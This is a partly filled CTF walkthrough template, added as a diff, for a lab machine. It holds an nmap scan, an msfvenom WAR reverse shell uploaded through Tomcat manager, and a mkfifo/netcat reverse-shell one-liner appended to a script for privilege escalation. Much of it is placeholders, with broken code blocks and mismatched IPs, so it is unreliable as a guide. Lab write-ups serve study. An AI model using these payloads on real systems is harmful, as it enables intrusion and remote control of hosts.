@@ -1,1 +1,160 @@
 
+# CTF Walkthrough
+
+## Machine Details
+- **Target IP:** 10.10.10.18
+- **Difficulty:** [Easy/Medium/Hard]
+- **Technologies:** [List relevant technologies]
+
+## 1. Setup Instructions
+- Prepare virtual machine
+- Configure network settings
+- Ensure necessary tools are installed
+
+## 2. Reconnaissance (Recon)
+
+### Network Scanning
+```bash
+# Discover network hosts
+netdiscover -r 10.10.10.0/24
+
+# Comprehensive port scanning
+nmap -sV -v -Pn 10.10.10.X
+nmap -sC -A -v -p- 10.10.10.X
+```
+
+### Scan Results
+```
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.2
+22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+110/tcp  open  pop3        Dovecot pop3d
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp  open  imap        Dovecot imapd (Ubuntu)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+631/tcp  open  ipp         CUPS 1.7
+993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)
+995/tcp  open  ssl/pop3    Dovecot pop3d
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+3306/tcp open  mysql       MySQL (unauthorized)
+5432/tcp open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+
+```
+
+## 3. Enumeration
+- Identify services
+- Look for potential vulnerabilities
+- Check configuration files
+- Explore web applications
+
+## 4. Vulnerability Identification
+
+### Vulnerability Discovery
+- **Vulnerable Version:** 
+- **Exploit Source:** 
+
+### Vulnerability Details
+⚠️ **Vulnerability Name**
+- Detailed vulnerability description
+- Potential impact
+
+### Exploit Preparation
+```bash
+# Exploit execution commands
+```
+msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.10.4 lport=443 -f war -o file26.war   
+
+7z l file26.war
+
+attackermachine
+nc -nlvp 443
+
+target upload file26.war 
+
+http://10.10.10.26:8080/manager/html
+chame ele e passa nome do arquivo /file26/xxxxxxx
+
+
+### Important Exploitation Notes
+- Specific challenges
+- Potential modification requirements
+- Compatibility considerations
+
+## 5. Exploitation Techniques
+
+### Primary Exploitation Method
+```bash
+# Exploitation code/commands
+```python -c 'import .....
+
+
+### Exploitation Steps
+1. Step-by-step exploitation process
+2. Detailed commands
+3. Potential variations
+
+
+
+cd /tab
+ls -lha
+vamos escrever no script.sh
+
+na maquina de ataque para fazer  privilegio escalation
+ msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.4 lport=80 -f raw   
+mkfifo /tmp/zcmw; nc 10.10.10.4 80 0</tmp/zcmw | /bin/sh >/tmp/zcmw 2>&1; rm /tmp/zcmw
+ 
+
+
+## 6. Privilege Escalation
+
+### Privilege Escalation Techniques
+```bash
+# Privilege escalation commands
+
+maquina de ataque nc -nlvp 80 e espere
+
+echo "mkfifo /tmp/zcmw; nc 10.10.10.4 80 0</tmp/zcmw | /bin/sh >/tmp/zcmw 2>&1; rm /tmp/zcmw
+" >> script.sh
+
+
+## 7. Post-Exploitation
+- Maintain system access
+- Collect additional information
+- Identify further exploitation paths
+
+## 8. Flag Collection
+```bash
+# Typical flag locations
+cd /root
+cat *flag*.txt
+```
+
+## 9. Conclusion
+- Summarize exploitation technique
+- Document lessons learned
+- Note effective tools and methods
+
+## 10. Recommendations
+- Security improvements
+- Patch recommendations
+- Best practices
+
+## Appendix: Potential Challenges
+- Specific technical challenges
+- Debugging tips
+- Potential roadblocks
+
+### References
+- [Relevant Security Resources]
+- [Exploit Details]
+
+## Author's Notes
+🔍 **Debugging Tips:**
+- Key insights
+- Personal observations
+- Lessons learned
